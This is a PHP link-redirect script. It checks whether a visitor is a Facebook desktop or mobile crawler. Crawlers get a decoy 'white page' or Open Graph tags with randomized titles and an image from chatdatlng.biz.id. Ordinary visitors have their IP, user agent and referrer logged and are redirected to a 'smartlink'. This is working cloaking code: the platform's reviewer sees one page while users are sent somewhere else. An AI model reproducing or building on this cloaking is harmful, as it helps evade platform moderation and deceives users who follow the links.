<?php
require_once 'mobile_protection.php';
require_once 'desktop_protection.php';

function logError($message) {
    $errorLog = date('Y-m-d H:i:s') . " - Error: " . $message . "\n";
    file_put_contents(__DIR__ . '/error.log', $errorLog, FILE_APPEND);
}

try {
    $token = $_GET['token'] ?? '';

    if (!$token) {
        http_response_code(404);
        echo 'Invalid link';
        exit;
    }

    $links = json_decode(file_get_contents(__DIR__ . '/links.json'), true) ?? [];
    $linkData = null;
    foreach ($links as $link) {
        if ($link['token'] === $token) {
            $linkData = $link;
            break;
        }
    }

    if (!$linkData) {
        http_response_code(404);
        echo 'Link not found';
        exit;
    }

    $mobileProtection = new AdvancedMobileProtection();
    $desktopProtection = new DesktopProtection();

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    if ($desktopProtection->isDesktopFacebookBot($userAgent)) {
        $desktopProtection->serveWhitePage($linkData);
    }

    if ($mobileProtection->isMobileFacebookBot($userAgent)) {
        $title = htmlspecialchars($linkData['og']['title'] ?? '') . ' ' . bin2hex(random_bytes(3));
        $description = htmlspecialchars($linkData['og']['description'] ?? '') . ' ' . bin2hex(random_bytes(3));
        $image = 'https://chatdatlng.biz.id/images/white_mobile.jpg?v=' . bin2hex(random_bytes(4));
        $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
        header('Content-Type: text/html; charset=utf-8');
        echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>{$title}</title>
    <meta property="fb:app_id" content="1604020986967005" />
    <meta property="og:title" content="{$title}" />
    <meta property="og:description" content="{$description}" />
    <meta property="og:image" content="{$image}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:url" content="{$url}" />
    <meta property="og:type" content="website" />
</head>
<body>
    <div style="display:none;">{$description}</div>
</body>
</html>
HTML;
        exit;
    }

    $finalUrl = $mobileProtection->process($linkData['smartlink']);

    $clicks = json_decode(file_get_contents(__DIR__ . '/clicks.json'), true) ?? [];
    $clicks[] = [
        'token' => $token,
        'timestamp' => time(),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
        'user_agent' => $userAgent,
        'referrer' => $_SERVER['HTTP_REFERER'] ?? ''
    ];
    file_put_contents(__DIR__ . '/clicks.json', json_encode($clicks, JSON_PRETTY_PRINT));

    header('Location: ' . $finalUrl);
    exit;

} catch (Exception $e) {
    logError($e->getMessage());
    http_response_code(500);
    echo 'Redirect error. Please try again later.';
    exit;
}
?>
